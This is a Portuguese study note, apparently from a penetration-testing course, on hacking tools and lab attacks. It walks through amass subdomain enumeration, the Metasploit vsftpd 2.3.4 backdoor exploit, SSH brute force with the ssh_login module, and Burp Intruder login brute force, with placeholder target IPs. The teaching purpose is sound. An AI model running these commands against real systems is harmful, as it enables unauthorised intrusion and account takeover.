# Ferramentas usadas por hackers

## Sistema Operacional
- **Kali Linux**

## Ferramentas
- **BeEF**
- **Nmap**
- **Burp Suite**
- **Metasploit**
    - Máquina feita para ser invadida
    - Aplicações:
        - DVWA Security

---

# Exemplos de ataques

## Enumeração de Domínio

- **Ferramenta:** amass (terminal)
    - Tenta encontrar subdomínios
    - **Exemplo:**
      ```bash
      amass enum -d dominio.com
      ```

---

## Backdoor

Permite roubar sessões.

- **Ferramenta:** Zenmap (IDE)
    - Enumeração de portas
    - **Exemplo:**
      1. Preencher Target
      2. Profile: Quick scan plus

- **Ferramenta:** msfconsole
    - Banco de dados de vulnerabilidades conhecidas e exploits
    - **Exemplo:**
      ```bash
      msfconsole
      msf6> search vsftpd 2.3.4
      msf6> use exploit/unix/ftp/vsftpd_234_backdoor
      msf6 exploit(unix/ftp/vsftpd_234_backdoor)> show options
      msf6 exploit(unix/ftp/vsftpd_234_backdoor)> set RHOST {IP da máquina atacada}
      msf6 exploit(unix/ftp/vsftpd_234_backdoor)> run
      ```

---

## Brute Force (SSH)

- **Ferramenta:** msfconsole
    - **Exemplo:**
      ```bash
      msfconsole
      msf6> search ssh login
      msf6> use auxiliary/scanner/ssh/ssh_login
      msf6 auxiliary(scanner/ssh/ssh_login)> show options
      msf6 auxiliary(scanner/ssh/ssh_login)> set VERBOSE true
      msf6 auxiliary(scanner/ssh/ssh_login)> set RHOST {IP da máquina atacada}
      msf6 auxiliary(scanner/ssh/ssh_login)> set PASS_FILE /{caminho do arquivo}.txt
      msf6 auxiliary(scanner/ssh/ssh_login)> set USER_FILE /{caminho do arquivo}.txt
      msf6 auxiliary(scanner/ssh/ssh_login)> run
      msf6 auxiliary(scanner/ssh/ssh_login)> sessions -i {ID da sessão atacada}
      ```

---

## Brute Force (HTTP)

- **Ferramenta:** Burp Suite (IDE)

### Passos

1. **Interceptar tráfego através de um Proxy**
    - Configurar Proxy no Burp Suite
        - Host: `127.0.0.1`
        - Port: `8080`
    - Configurar Proxy no Navegador
        - Baixar extensão do Chromium: `SwitchyOmega`
        - Configurar 'System Proxy'
            - Host: `127.0.0.1`
            - Port: `8080`
2. Fazer a requisição de login no navegador
3. Enviar requisição interceptada para o Intruder

---

### Realizar requisições de ataque

- **Configurar o Intruder:**
    - **Target**
        - Host: `{IP da máquina atacada}`
        - Port: `80`
    - **Positions**
        - Definir tipo do ataque: *Cluster bomb*
    - **Payloads**
        - Configurar variáveis do payload
    - **Options**
        - Configurar *Grep - Match*

